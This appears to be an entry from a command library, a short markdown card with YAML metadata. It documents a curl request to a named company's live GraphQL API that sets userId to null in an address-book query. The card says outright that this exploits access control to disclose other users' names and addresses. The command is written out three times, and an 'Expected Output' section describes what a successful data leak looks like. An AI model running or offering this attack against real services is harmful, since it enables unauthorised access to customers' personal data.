---
id: cmd-uuid-1
data: >-
  curl -X POST https://api.starbucks.com/graphql -H "Content-Type:
  application/json" -H "Authorization: Bearer YOUR_TOKEN" -d '{"query": "query
  GetAddressBook($userId: ID!) { addressBook(userId: $userId) { entries { name
  address } } }", "variables": {"userId": null}}'
tags:
  - graphql
  - api
type: command
output: null
executor: bash
platforms:
  - Web
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.505Z'
verified: false
validated: true
submitted: true
---
# send-graphql-query-curl

## Command

```bash
curl -X POST https://api.starbucks.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query": "query GetAddressBook($userId: ID!) { addressBook(userId: $userId) { entries { name address } } }", "variables": {"userId": null}}'
```

## Description

Sends a POST request to the Starbucks GraphQL endpoint with a modified query to exploit access control by setting userId to null, triggering 'undefined' parameter handling and potential data disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Provides auth token | Yes |
| `-d '{...}'` | Query and variables payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.starbucks.com/graphql -H "Content-Type: application/json" -H "Authorization: Bearer YOUR_TOKEN" -d '{"query": "query GetAddressBook($userId: ID!) { addressBook(userId: $userId) { entries { name address } } }", "variables": {"userId": null}}'
```

### Advanced Usage

```bash
curl -X POST https://api.starbucks.com/graphql -H "Content-Type: application/json" -H "Authorization: Bearer YOUR_TOKEN" -d '{"query": "query GetAddressBook($userId: ID!) { addressBook(userId: $userId) { entries { name address } } }", "variables": {"userId": null}}' | jq '.data'
```

## Expected Output

JSON response with addressBook object containing entries array; successful exploitation shows data from 'undefined' accounts, e.g., {"data":{"addressBook":{"entries":[{"name":"John Doe","address":"123 Main St"}]}}}.

## Related

- [[Related Procedure]]
